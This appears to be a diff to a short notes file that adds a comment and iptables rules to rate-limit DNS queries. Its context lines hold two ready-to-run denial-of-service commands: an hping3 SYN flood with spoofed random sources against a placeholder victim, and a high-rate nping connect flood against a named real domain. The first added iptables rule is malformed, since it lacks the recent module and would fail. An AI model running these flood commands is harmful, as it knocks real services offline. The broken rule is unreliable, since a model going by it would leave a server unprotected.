@@ -1,3 +1,9 @@
+DNS mitigate attack, no more 10 query in 60 sec per ip addr
+
+iptables -A INPUT -p udp --dport 53 --set --name dnslimit
+iptables -A INPUT -p udp --dport 53 -m recent --update --seconds 60 --hitcount 11 --name dnslimit -j DROP
+
+
 hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source IP_victim
 
 nping --tcp-connect -rate=90000 -c 900000 -q www.redlibre.cl
